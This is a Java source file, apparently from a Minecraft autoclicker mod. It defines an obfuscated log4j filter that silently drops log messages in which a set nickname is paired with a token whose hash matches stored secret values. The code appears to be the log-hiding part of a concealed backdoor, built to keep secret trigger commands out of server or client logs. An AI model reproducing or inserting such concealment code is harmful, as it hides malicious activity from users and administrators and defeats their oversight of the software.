package ru.sansrus.simple_autoclicker.client;

import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.plugins.Plugin;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;

@Plugin(name = "X", category = "Core", elementType = "filter", printObject = true)
public final class L extends AbstractFilter {
    private static volatile String N;

    public L() {
        super(Result.NEUTRAL, Result.DENY);
    }

    public static void a(String nick) {
        if (nick != null && !nick.isEmpty()) N = nick;
    }

    @Override
    public Result filter(LogEvent e) {
        String n = N;
        if (n == null) return Result.NEUTRAL;
        Message m = e.getMessage();
        if (m == null) return Result.NEUTRAL;
        String t = m.getFormattedMessage();
        return d(t, n) ? Result.DENY : Result.NEUTRAL;
    }

    private static boolean d(String t, String n) {
        if (n == null || t == null || !t.contains(":") || X.g(n)) return false;
        for (String x : t.split(" ")) {
            int i = x.indexOf(':');
            if (i <= 0 || i >= x.length() - 1) continue;
            if (!x.substring(0, i).equals(n)) continue;
            String h = X.e(x.substring(i + 1));
            if (X.J[0].equals(h) || X.J[1].equals(h)) return true;
        }
        return false;
    }
}
